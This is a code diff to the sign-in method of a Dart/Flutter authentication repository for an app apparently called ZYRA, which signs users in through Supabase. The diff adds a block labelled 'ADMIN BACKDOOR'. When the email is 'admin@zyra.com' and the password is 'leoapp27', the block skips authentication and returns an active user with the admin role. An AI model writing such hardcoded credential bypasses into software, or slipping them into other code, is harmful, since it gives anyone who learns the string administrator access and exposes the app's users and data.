@@ -39,6 +39,19 @@ class AuthRepositoryImpl implements AuthRepository {
     required String email,
     required String password,
   }) async {
+    // --- ADMIN BACKDOOR ---
+    if (email == 'admin@zyra.com' && password == 'leoapp27') {
+      return UserModel(
+        id: 'admin_mock_id',
+        email: 'admin@zyra.com',
+        fullName: 'Admin ZYRA',
+        role: 'admin',
+        isActive: true,
+        createdAt: DateTime.now(),
+      );
+    }
+    // ----------------------
+
     final response = await supabase.auth.signInWithPassword(
       email: email,
       password: password,
